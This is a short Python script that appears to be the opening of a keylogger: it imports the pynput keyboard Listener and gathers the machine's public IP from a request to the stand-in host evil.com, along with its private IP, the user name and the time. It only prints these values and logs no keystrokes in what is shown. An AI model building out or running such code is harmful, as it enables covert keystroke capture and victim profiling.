from pynput.keyboard import Key, Listener
import time
import os
import requests
import random
import socket


PublicIP = requests.get('https://evil.com').text
PrivateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[0]
datetime= time.ctime(time.time())

print(PublicIP)
print(PrivateIP)
print(datetime)
print(user)